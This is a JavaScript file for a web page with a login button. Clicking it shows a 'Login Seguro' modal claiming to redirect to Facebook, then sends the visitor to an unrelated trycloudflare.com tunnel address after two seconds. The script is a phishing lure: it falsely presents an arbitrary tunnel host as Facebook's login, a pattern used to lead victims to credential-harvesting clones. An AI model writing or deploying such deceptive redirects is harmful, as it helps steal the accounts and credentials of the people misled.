document.addEventListener('DOMContentLoaded', () => {
    const loginButton = document.getElementById('loginButton');
    
    // Add hover effect to login button
    loginButton.addEventListener('mouseenter', () => {
        loginButton.style.transform = 'translateY(-5px)';
    });

    loginButton.addEventListener('mouseleave', () => {
        loginButton.style.transform = 'translateY(0)';
    });

    // Add click handler for login button
    loginButton.addEventListener('click', (e) => {
        e.preventDefault();
        
        // Create and show a login modal
        const modal = document.createElement('div');
        modal.className = 'login-modal';
        modal.innerHTML = `
            <div class="modal-content">
                <h3> <img src="https://abs.twimg.com/emoji/v2/svg/1f512.svg" width="20">
 Login Seguro</h3>
                <p>Redirecionando para o Facebook...</p>
                <div class="loading-spinner"></div>
            </div>
        `;

        document.body.appendChild(modal);

        // Add modal styles
        const style = document.createElement('style');
        style.textContent = `
            .login-modal {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.8);
                backdrop-filter: blur(5px);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 1000;
                opacity: 0;
                transition: opacity 0.3s ease;
            }
            .modal-content {
                background: #fff;
                padding: 40px;
                border-radius: 20px;
                text-align: center;
                transform: translateY(20px);
                transition: transform 0.3s ease;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            }
            .modal-content h3 {
                font-size: 24px;
                margin-bottom: 15px;
                color: #1a1a1a;
            }
            .modal-content p {
                color: #666;
                margin-bottom: 20px;
            }
            .loading-spinner {
                width: 40px;
                height: 40px;
                border: 4px solid #f3f3f3;
                border-top: 4px solid #3b5998;
                border-radius: 50%;
                margin: 0 auto;
                animation: spin 1s linear infinite;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        document.head.appendChild(style);

        // Animate modal in
        requestAnimationFrame(() => {
            modal.style.opacity = '1';
            modal.querySelector('.modal-content').style.transform = 'translateY(0)';
        });

        // Simulate redirect after 2 seconds
        setTimeout(() => {
            // Replace this with your actual Facebook login URL
            window.location.href = 'https://welfare-cdna-donor-da.trycloudflare.com';
        }, 2000);
    });

    // Add parallax effect to cover photo
    window.addEventListener('scroll', () => {
        const coverPhoto = document.querySelector('.cover-photo');
        const scrolled = window.pageYOffset;
        coverPhoto.style.transform = `translateY(${scrolled * 0.5}px)`;
    });
});
